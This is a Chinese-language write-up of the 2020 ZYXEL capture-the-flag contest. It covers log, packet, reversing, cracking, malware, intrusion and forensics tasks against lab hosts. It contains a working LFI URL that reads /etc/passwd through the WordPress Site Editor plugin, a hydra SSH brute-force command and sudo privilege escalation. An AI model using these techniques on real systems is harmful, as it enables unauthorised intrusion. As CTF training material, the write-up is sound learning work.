---
title: "2020 合勤【榮耀資戰 – 重裝上陣】WriteUp" 
date: 2020-05-31T23:00:00+08:00
hero: ZYXEL.jpg
menu:
  sidebar:
    name: "2020 ZYXEL CTF WriteUp"
    identifier: ZYXEL-CTF-WriteUp
    parent: WriteUp
    weight: 14
math: true
---

## 日誌分析

### [2pts] 日誌分析-01
#### 題目
- 說明：
    - Log 為誘捕系統連線資訊，請分析在此份 log 中，駭客最感興趣的前三名服務。flag為前三名服務 port 號，依序合併後的SHA1加密值(小寫)。

- 範例： 
    - 前三名服務 [80,5060,21] -> sha1('80506021') -> eeeb577554eeba6a9481f7e0306a514105724fca
- 答案格式：
    - flag{port號合併後的SHA1加密值}
- 檔案：`exam1.txt.zip`

#### 解法
1. Linux Shell
    ```shell=
    cat exam1.txt | awk '{print $4}'| sort | uniq -c | sort -k 1 -nr | head -3
    ```
    ```
    87670 168.95.4.5:445
    9700 168.95.4.5:1433
    3528 168.95.4.5:23
    ```
2. flag = sha1(445143323)
3. **flag{0e2c3e4dd79f9a26e591728c8af4e8347403127a}**

### [2pts] 日誌分析-02
#### 題目
- 說明：
    - Log為誘捕系統連線資訊，請分析在此份log中，攻擊次數最多的IP，flag為IP的SHA1加密值(小寫)
- 答案格式：
    - flag{IP的SHA1加密值}
- 檔案：`exam2.txt.zip`

#### 解法
1. Linux Shell
    ```shell=
    cat exam2.txt | awk '{print $2}'| sort | uniq -c | sort -k 1 -nr | head -1
    ```
    ```
    14424 94.102.49.91:42562
    ```
2. flag = sha1(94.102.49.91)
3. **flag{ffd04754ddf2b714d0779f4d415530550b4e4b91}**

### [6pts] 日誌分析-03
#### 題目
- 說明：
    - 此份Log記錄者駭客入系統的軌跡，駭客似乎在某個公共服務中下載惡意程式，裡面藏有flag。
- 答案格式：
    - flag{惡意程式裡面藏的flag}
- 檔案：`exam3.txt.zip`

#### 解法
1. Linux Shell
    ```shell=
    cat exam3.txt L grep \/\/
    ```
![](https://i.imgur.com/0OA1LNG.png)

2. 
![](https://i.imgur.com/0lST4w5.jpg)

3. **flag{uEXC6fOPQBgJjUL}**

## 封包分析

### [2pts] 封包分析-01
#### 題目
- 說明：
    - 請分析題目所給網路封包檔案，判斷攻擊者使用了什麼攻擊手法
- 範例：
    - CVE-2020-0606
- 答案格式：
    - flag{CVE-XXXX-XXXX}
- 檔案：`lab01.pcapng.zip`

#### 解法
1.
![](https://i.imgur.com/JwwZMaS.png)
2. **flag{CVE-1999-0532}**

### [6pts] 封包分析-02
#### 題目
- 說明：
    - 某公司的資料疑似外洩，這期間剛好錄製了相關的網路行為。請嘗試著分析這中間所發生的行為，並嘗試著尋找外洩的機密檔案。
- 答案格式：
    - flag{機密檔案內容}
- 檔案：`lab02.pcapng.zip`

#### 解法
![](https://i.imgur.com/VdXorwT.png)
**flag{7a0f7e5ee037244f6dbb6caf464b56}**

### [6pts] 封包分析-03
#### 題目
- 說明：
    - 這是某公司的電腦，使用者發現電腦怪怪的，似乎被駭客入侵了。試著分析一下這台電腦發生了什麼事情，請協助找到後門使用來登入的帳號 。
- 答案格式：
    - flag{後門登入帳號}
- 檔案：`lab03.pcapng.zip`

#### 解法
![](https://i.imgur.com/ncq0nzb.png)
![](https://i.imgur.com/enirwi7.png)
**flag{hellow0rld9487}**

## 逆向工程

### [2pts] 逆向工程-01
#### 題目
- 說明：
    - 密碼猜猜看，猜對我的密碼就送你Flag ( ^.＜ )
- 答案格式：
    - flag{我的密碼}
- 檔案：`guess.zip`

#### 解法
1.  
    ```python=
    from pwn import *
    r = process("./guess")

    r.sendline(str(123))
    qq = r.recvline()
    qq = qq.split('is: ')
    ans = int(qq[1])
    r.sendline(str(ans))
    r.interactive()
    ```
    - rxms{8ycAkPT1S0ejl7R4}
2. Caesar(rxms{8ycAkPT1S0ejl7R4})
3. **flag{8mqOyDH1G0sxz7F4}**

### [6pts] 逆向工程-02
#### 題目
- 說明：
    - 1 ~ 1073741824猜一個幸運數字，猜對即可取得Flag
- 答案格式：
    - flag{xxxxxxxxxx}
- 檔案：`lucky_number.zip`

#### 解法
??? 
在程式將使用者輸入資料進行 cmp 時，把兩邊data 改成一樣ㄉ就好惹w

## 密碼破解

### [2pts] 密碼破解-01
#### 題目
- 說明：
    - 這是攻擊者從某台伺服器竊取的shadow檔，請嘗試著幫我把這位使用者的密碼解開來，密碼即是flag
- 答案格式：
    - flag{password}
- 檔案：`jack-shadow.zip`

#### 解法
??? 爆不出來


### [2pts] 密碼破解-02
#### 題目
- 說明：
    - 小文想給巧克力一個寓言故事參考，附件為寓言故事。
- 答案格式：
    - flag{xxxxxxxxxx}
- 檔案：`story.txt.zip`

#### 解法
1. 解壓縮後，將 story.txt Base64 後，擷取部分字串
    
    ```
    wcrx{iuLe3Ywfo7G45Kds}
    ```
2. Caesar(wcrx{iuLe3Ywfo7G45Kds})
    ```
    flag{rdUn3Hfox7P45Tmb}
    ```
3. **flag{rdUn3Hfox7P45Tmb}**


## 惡意程式分析
- VM下載連結： https://pse.is/malware ， 解壓縮密碼：malware

- **警告!!! 本題目為真實惡意程式，存在惡意連線行為!!! 請使用者謹慎操作，在斷網隔離環境中進行分析，並關閉防毒軟體防護機制以避免阻擋。**

### [2pts] 惡意程式分析-01 
#### 題目
- 說明：
    - 請分析名稱為 malware01 的惡意程式，並找出相關行為及計算出 Flag
    - 
- 答案格式：
    - flag{惡意網域名稱的SHA1值(小寫)}
- 檔案：`malware01.zip`

#### 解法
![](https://i.imgur.com/w67ZUBD.png)

flag = sha1(url)
**flag{78eb3cfa4aba8060340c0486765160e99e4fa69f}**

### [2pts] 惡意程式分析-02
#### 題目
- 說明：
    - 請分析名稱為 malware02 的惡意程式，並找出相關行為及計算出 Flag
- 答案格式：
    - flag{實際執行的惡意程式SHA1值(小寫)}
- 檔案：`malware02.zip`

#### 解法
![](https://i.imgur.com/sO03a8D.png)
**flag{fa5c79321dd4cc2fea795d6ebe2e823abe33ca6f}**


### [6pts] 惡意程式分析-03
#### 題目
- 說明：
    - 請分析名稱為malware03的惡意程式，並找出存在於中繼站的Flag
- 答案格式：
    - flag{中繼站的Flag}
- 檔案：`malware03.zip`

#### 解法
1. https://app.any.run/tasks/0cf60ad1-99eb-45a0-83ab-730c3bc3c111
2. http://10.100.220.41:8443/
3. ![](https://i.imgur.com/ZWYkFdf.png)
4. https://downzen.com/en/windows/gandcrab-v5-1-decryptor/download/
5. **flag{a3bbc9af09f6acc0d64c3b3fe4becba5c671633d}**


## 綜合題型
### [2pts] 綜合題型-01
#### 題目
- 說明：
    - 請尋找存在於此 IP(10.100.229.20) 內的Flag
- 答案格式：
    - flag{尋找到的flag}

#### 解法
![](https://i.imgur.com/5waSk4i.png)
![](https://i.imgur.com/z0lKRql.png =400x)
**flag{e572f8c5ea06ad8f1e2c3f441e9a8f1b}**

### [6pts] 綜合題型-02
#### 題目
- 說明：
    - 請挑選此IP範圍(10.100.229.24 - 10.100.229.32)內的任何一台弱點主機進行滲透，取得使用者的登入帳號，名稱的開頭好像是flag喔～
- 答案格式：
    - flag{username}

#### 解法
1. wpscan
    ```
    [+] site-editor
     | Location: http://10.100.229.26/wp-content/plugins/site-editor/
     | Latest Version: 1.1.1 (up to date)
     | Last Updated: 2017-05-02T23:34:00.000Z
     |
     | Detected By: Urls In Homepage (Passive Detection)
     |
     | [!] 1 vulnerability identified:
     |
     | [!] Title: Site Editor <= 1.1.1 - Local File Inclusion (LFI)
     |     References:
     |      - https://wpvulndb.com/vulnerabilities/9044
     |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7422
     |      - https://seclists.org/fulldisclosure/2018/Mar/40
     |      - https://github.com/SiteEditor/editor/issues/2
     |
     | Version: 1.1.1 (80% confidence)
     | Detected By: Readme - Stable Tag (Aggressive Detection)
     |  - http://10.100.229.26/wp-content/plugins/site-editor/readme.txt
    ```


2. Get PoC
    - Source: https://seclists.org/fulldisclosure/2018/Mar/40

    - http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd

3. LFI
    - http://10.100.229.26/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
    
    ![](https://i.imgur.com/eUS8RBA.png)

4. **flag{flag95276ca8d6f}**
    

### [10pts] 綜合題型-03
#### 題目
- 說明：
    - 請挑選此IP範圍(10.100.229.10 - 10.100.229.19)內的任何一台弱點主機，並找出存在於網站系統內的Flag
- 答案格式：
    - flag{主機系統內的flag}

#### 解法
https://www.hackercoolmagazine.com/hacking-easy-file-sharing-http-server-metasploit/

```
C:\Documents and Settings>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3C20-DAF1

 Directory of C:\Documents and Settings

04/26/2020  05:50 PM    <DIR>          .
04/26/2020  05:50 PM    <DIR>          ..
07/19/2017  07:55 PM    <DIR>          Administrator
04/26/2020  05:50 PM    <DIR>          All Users
04/26/2020  07:31 PM    <DIR>          ec2-user
04/26/2020  05:50 PM    <DIR>          Files
               0 File(s)              0 bytes
               6 Dir(s)  81,487,785,984 bytes free

C:\Documents and Settings>cd Files
cd Files

C:\Documents and Settings\Files>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3C20-DAF1

 Directory of C:\Documents and Settings\Files

04/26/2020  05:50 PM    <DIR>          .
04/26/2020  05:50 PM    <DIR>          ..
04/26/2020  05:50 PM    <DIR>          Admin
               0 File(s)              0 bytes
               3 Dir(s)  81,487,785,984 bytes free

C:\Documents and Settings\Files>cd Admin
cd Admin

C:\Documents and Settings\Files\Admin>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3C20-DAF1

 Directory of C:\Documents and Settings\Files\Admin

04/26/2020  05:50 PM    <DIR>          .
04/26/2020  05:50 PM    <DIR>          ..
04/25/2020  08:03 PM                40 secret.txt
               1 File(s)             40 bytes
               2 Dir(s)  81,487,785,984 bytes free

C:\Documents and Settings\Files\Admin>dir secret.txt
dir secret.txt
 Volume in drive C has no label.
 Volume Serial Number is 3C20-DAF1

 Directory of C:\Documents and Settings\Files\Admin

04/25/2020  08:03 PM                40 secret.txt
               1 File(s)             40 bytes
               0 Dir(s)  81,487,785,984 bytes free

C:\Documents and Settings\Files\Admin>type secret.txt
type secret.txt

FLAG{a16bf4ca10e9a63da75d6260d0619f99}
C:\Documents and Settings\Files\Admin>
```
**flag{a16bf4ca10e9a63da75d6260d0619f99}**

### 綜合題型-04 ==10pts==
#### 題目
- 說明：
    - 請挑選此IP範圍(10.100.229.10 - 10.100.229.19)內的任何一台弱點主機，並找出存在於郵件系統內的Flag
- 答案格式：
    - flag{主機系統內的flag}

#### 解法
??? 迷失在茫茫資料夾中



## 滲透測試
### [6pts] 滲透測試-01
#### 題目
- 說明：
    - 請挑選此IP範圍(10.100.229.34 - 10.100.229.43)內的任何一台弱點主機，入侵後取得家目錄下的flag檔案。
- 答案格式：
    - flag{找到的flag}

#### 解法
1. 先用 hydya 爆破
    ```
    hydra -l admin -P ~/tool/fuzzdb/wordlists-user-passwd/rockyou.txt -t 50 ssh://10.100.229.34                                       (-127) ↵  16:15:30
    Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-30 16:18:02
    [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
    [DATA] max 50 tasks per 1 server, overall 50 tasks, 14344398 login tries (l:1/p:14344398), ~286888 tries per task
    [DATA] attacking ssh://10.100.229.34:22/
    [22][ssh] host: 10.100.229.34   login: admin   password: 123456
    1 of 1 target successfully completed, 1 valid password found
    [WARNING] Writing restore file because 26 final worker threads did not complete until end.
    [ERROR] 26 targets did not resolve or could not be connected
    [ERROR] 50 targets did not complete
    Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-30 16:18:08
    ```
2. 用 admin/123456 可以成功登入
    ```
    admin@ubuntu:~$ ls
    flag.txt
    admin@ubuntu:~$ cat flag.txt
    cbf7a0ffec715232e38aa5b120994bcc
    ```
3. **flag{cbf7a0ffec715232e38aa5b120994bcc}**

### [10pts] 滲透測試-02
#### 題目
- 說明：
    - 請挑選此IP範圍(10.100.229.34 - 10.100.229.43)內的任何一台弱點主機，入侵後取得root家目錄下的flag檔案
- 答案格式：
    - flag{找到的flag}
 
#### 解法
1. 先執行 sudo -l 看看 `sudo` 指令能夠執行什麼權限
    ```
    admin@ubuntu:~$ sudo -l
    [sudo] password for admin: 123456
    Matching Defaults entries for admin on ubuntu:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User admin may run the following commands on ubuntu:
        (ALL) ALL
    ```
2. 發現 sudo 竟然可以執行所有指令，意味著可以直接使用 `sudo su` 提權
    ```
    admin@ubuntu:~$ sudo su
    root@ubuntu:/home/admin# cd /root
    root@ubuntu:~# ls
    flag.txt
    root@ubuntu:~# cat flag.txt
    566b701a1628043018227f28f3ef24d3
    ```
3. **flag{566b701a1628043018227f28f3ef24d3}**

## 數位鑑識
### [10pts] 數位鑑識-01 
#### 題目

- 說明：
    - 請找出惡意程式下載連結及常駐於系統的惡意程式
- 答案格式：
    flag{SHA1(惡意程式下載連結+惡意程式的雜湊值(SHA256))}
- 範例：
    ```
    SHA1(http://malware.ru+673ca3e002aa0991096c32f6c40f2afb2674ae353ac0e21f692c29c6369e9712)
    ```
- 檔案：`forensics.vmem`
    
#### 解法
???

